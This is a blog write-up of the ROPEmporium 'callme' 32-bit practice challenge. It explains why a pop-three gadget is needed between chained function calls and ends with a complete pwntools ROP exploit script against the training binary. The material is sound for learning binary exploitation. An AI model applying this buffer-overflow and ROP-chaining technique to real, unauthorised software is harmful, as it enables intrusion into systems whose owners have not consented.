---
title: "ROPEmporium: callme 32-bit"
date: 2021-05-24T14:57:00+02:00
---

# Writeup of callme [callme] on ROPEmporium

How do you make consecutive calls to a function from your ROP chain that won't crash afterwards? 
If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.

This is the information we're greeted with in the callme challenge. 

What we need to do is call the functions "callmeone", "callmetwo", "callmethree" all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.

Let's look at the binary with radare2:

```c 
>  0x08048570   50 entry0                                   
   0x080486ed   98 sym.pwnme
   0x080484c0    6 sym.imp.read
   0x0804874f   67 sym.usefulFunction
   0x080484e0    6 sym.imp.callme_three <- Call_three
   0x08048550    6 sym.imp.callme_two <- Call_two
   0x080484f0    6 sym.imp.callme_one <- Call_one
   0x08048686  103 main
 ``` 

Okay! So this should be easy. Let's look at the stack we want.

```
┌────────────┐
│            │
│ 0xd00df00d │
│            │
├────────────┤
│            │
│ 0xcafebabe │
│            │
├────────────┤
│            │
│ 0xdeadbeef │
│            │
├────────────┤
│            │
│ callme_one │
│            │
└────────────┘
```


Now how do we continue with the next callme_two? Just the same principle? Is this even right?
I tried a payload that went something like this:

```python
payload=padding
payload+=callme_one+dead+cafe+dood
payload+=callme_two+dead+cafe+dood
payload+=callme_three+dead+cafe+dood
```

It's important to note, that when a function call is made a new **stack frame** is created. This is to avoid corrupting data outside a function, and also to save memory. Let's look at a simple python program that explains this quite well:

```python

def test():
    a = 10

def main():
    print(a)

test()
main()
```

This would yield a "NameError: name 'a' is not defined". To return from a function, it's important that the function has a return address. The return address is the first thing that will be pushed onto the stack after a function call.

We simply need some sort of way to return back after our function. It's also important to note, that we push data on to the stack, that shouldn't be there in the first place, this can cause issues when returning, as the program might interpret these in a different way then. We simply make our chain like this:

```
payload = callme_one+pop3+argv1+argv2+argv3
payload += callme_two+pop3+argv1+argv2+argv3
payload += callme_three+argv1+argv2+argv3
```

This firstly puts the pop3 as the return address after the function has been called. So it calls callme_one with the three arguments, then returns to pop3 which places these into registers, and removes them from the stack. Then it calls the next function, with the three arguments and afterwards places these into registers, effectively removing them from the stack. Lastly it calls callme_three and... flag

Exploit:

```python
from pwn import *

usefulFunction = b"\x4f\x87\x04\x08"
callmeone = p32(0x08048780) #b"\x80\x87\x04\x08"
callme_one_plt = p32(0x080484f0)
callme_two_plt = p32(0x08048550)
callmethree = p32(0x0804875e)

dbef = p32(0xdeadbeef)
cfbb = p32(0xcafebabe)
dfd = p32(0xd00df00d)

completeargv=dbef+cfbb+dfd

gdgtpopm = p32(0x080487f9) #pops three registers

elfPath="./callme32"
context.arch="i386"

gdbscript="""
break *0x080484f0
"""

terminalSetting = ['gnome-terminal', '-e']
context.clear(terminal=terminalSetting)


io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)

#mnm = cyclic_gen()
#mnm = mnm.get(80)
point=cyclic_find(b"laaa", endian="little")
#6161616c is at the return or laaa


#https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames

def main():
    print(io.recvuntil("> "))
    payload=b"A"*point
    payload+=callme_one_plt+gdgtpopm+completeargv
    payload+=callme_two_plt+gdgtpopm+completeargv  
    payload+=callmethree+completeargv  

    io.send(payload)
    io.interactive()

main()
```
